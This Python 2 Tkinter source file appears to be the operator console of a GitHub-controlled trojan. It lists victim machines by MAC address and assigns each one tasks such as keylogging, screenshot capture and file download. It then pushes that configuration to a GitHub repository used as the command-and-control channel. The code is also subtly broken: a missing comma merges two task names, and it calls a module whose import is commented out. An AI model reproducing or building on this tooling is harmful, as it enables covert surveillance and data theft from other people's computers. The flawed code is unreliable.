# -*- coding:utf-8 -*-
import dirlister
from Tkinter import *
import os
import pro
#import findfl
import UI2
import keylogger
import prehack
import fileOperationForHacker
global task_list
global task_record
global gh
global repo
global branch
#gh, repo, branch = fileOperationForHacker.connect_to_github()
task_record={}
task_list=["DownloadFile","screenshotter""keylogger"]
global connect_flag
connect_flag=0 #下线
global connect_dict #靳然的key （mac 和ip )
config_dict={"F8-16-54-C9-7E-30":[],"1010101":[],"0C84Dd":[]}#在线的电脑
connect_dict={"F8-16-54-C9-7E-30":[],"1010101":[],"0C84Dd":[]}

def show_info_page():
    return 0
global mac
def CallCheckbutton1():#判断任务

    global config_dict
    global mac
    print mac
    print(config_dict)
    task1 = v_task1.get()
    task_record["DownloadFile"]=task1
    print(task_record)
    return(0)

def CallCheckbutton2():  # 判断任务
    global config_dict
    global mac
    print mac
    print(config_dict)
    task2 = v_task2.get()
    task_record["screenshotter"] = task2
    print(task_record)
    return (0)
def CallCheckbutton3():
    global config_dict
    global mac
    print mac
    print(config_dict)
    task3 = v_task3.get()
    task_record["keylogger"] = task3
    print(task_record)
    return (0)
    #connect_dict=prehack.connect_list()     #所有在线的东西


def show_info_page():
    page = Toplevel()
    page.title('提示')
    page.geometry('200x200')
    Label(page, text='请选择任务').pack()

def profile_find_run():
    root = Tk()
    root.title("file chooser")
    root.geometry("530x340")

    var = StringVar()
    fl = []
    isf = [FALSE]

    def print_item(event):
        s = lb.get(lb.curselection())
        if isf[0] == TRUE:
            fl.pop()
        fl.append(s)
        p = '\\'.join(fl)
        if findfl.GetFileList(p) != 0:
            if '\\' not in p:
                p += '\\'
            lb.delete(0, END)
            for item in findfl.GetFileList(p):
                lb.insert(END, item)
            lb.bind('<ButtonRelease-1>', print_item)
        else:
            isf[0] = TRUE
        var2.set(p)  # 设置文本框中的值

    lb = Listbox(root, listvariable=var, height=15, width=90)
    list_item = []
    if findfl.GetFileList('c:\\') != 0:
        list_item.append('c:')
    if findfl.GetFileList('d:\\') != 0:
        list_item.append('d:')
    if findfl.GetFileList('e:\\') != 0:
        list_item.append('e:')
    if findfl.GetFileList('f:\\') != 0:
        list_item.append('f:')
    if findfl.GetFileList('g:\\') != 0:
        list_item.append('g:')
    for item in list_item:
        lb.insert(END, item)
    lb.bind('<ButtonRelease-1>', print_item)
    lb.pack()

    var2 = StringVar()
    e = Entry(root, textvariable=var2, width=90)
    e.pack()  # 这里的side可以赋值为LEFT  RTGHT TOP  BOTTOM

    def ok():
        print var2.get()
        root.destroy()

    def cancel():
        root.destroy()

    def goback():
        if isf[0] == TRUE:
            fl.pop()
            isf[0] = FALSE
        if fl:
            fl.pop()
            p = '\\'.join(fl)
            if '\\' not in p:
                p += '\\'
            lb.delete(0, END)
            for item in findfl.GetFileList(p):
                lb.insert(END, item)
            lb.bind('<ButtonRelease-1>', print_item)
            var2.set(p)  # 设置文本框中的值
            if p == '\\':
                lb.delete(0, END)
                for item in list_item:
                    lb.insert(END, item)
                lb.bind('<ButtonRelease-1>', print_item)
            if not fl:
                var2.set(" ")

    # icon = PhotoImage(file = 'C:\\Users\\yu\\Documents\\workspace\\nasd\\qwr.gif')
    Button(root, text="OK", height=1, width=8, command=ok).pack(side=RIGHT, padx=10)
    Button(root, height=1, width=8, text="Cancel", command=cancel).pack(side=LEFT, padx=10)
    Button(root, height=1, width=8, text="Last", command=goback).pack(side=LEFT)

    root.mainloop()  # 进入消息循环
    return 0


master = Tk()
var_grid = IntVar()

var_grid.set(3)

def Commit():
    #print("llllllllllllllll")
    global mac
    global repo

    gh, repo, branch = fileOperationForHacker.connect_to_github()
    print("llllllllllllllllllllll")
    print(config_dict)
    fileOperationForHacker.updateJSON(repo, config_dict)
    UI2.run(repo,mac)

def dict_add():

    global mac
    global task_list
    task_list=[]
    for k in task_record:
        if task_record[k]!='0':
            task_list.append(task_record[k])
    config_dict[mac]=task_list
    task_list=[]
    print config_dict





def mac_record():
    global mac
    mac=v_mac.get()
    print(mac)
    return mac
N=20
checkbutton={}
com_background= "computer2.gif"

img = PhotoImage(file=com_background)
#此处需要靳然的key（mac 和Ip）
#connect_dict=jr()
i=0
v_mac = StringVar()

v_task1=StringVar()


v_task2=StringVar()
v_task3=StringVar()

for j in connect_dict.keys():
    i=i+1
    button_name = "计算机" + str(i)

    # button[i] = Button(root, text="计算机1", command=dirlister.run, width=5).pack(side=BOTTOM)
    checkbutton[i] = Checkbutton(master, text=j, variable = v_mac,image=img, onvalue = j, offvalue = '0', command = mac_record,compound="right", anchor="w", bitmap="error").grid(row=i/5,column=i%5,sticky="N")

select1=Checkbutton(master,text = 'DownloadFile',variable=v_task1,image=img,onvalue='DownloadFile',offvalue='0',command = CallCheckbutton1,compound="right", anchor="w", bitmap="error")
select1.grid(columnspan=5, rowspan=2)
select2=Checkbutton(master,text = 'screenshotter',command = CallCheckbutton2,variable=v_task2,image=img,onvalue='screenshotter',offvalue='0',compound="right", anchor="w", bitmap="error")
select2.grid(columnspan=5, rowspan=3)
select3=Checkbutton(master,text = 'keylogger',command = CallCheckbutton3,variable=v_task3,image=img,onvalue='keylogger',offvalue='0',compound="right", anchor="w", bitmap="error")
select3.grid(columnspan=5, rowspan=4)
buttonOK = Button(master, text="ok", image=img, compound="right", anchor="w", command=dict_add,bitmap="error").grid(row=9,column=6,sticky="N")
buttonCOMMIT = Button(master, text="commit", image=img, compound="right", anchor="w", command=Commit,bitmap="error").grid(row=11,column=6,sticky="N")

lfc_field_1_t_sv =Scrollbar(master, orient=VERTICAL)  # 文本框-竖向滚动条
lfc_field_1_t_sh =Scrollbar(master, orient=HORIZONTAL)  # 文本框-横向滚动条


mainloop()


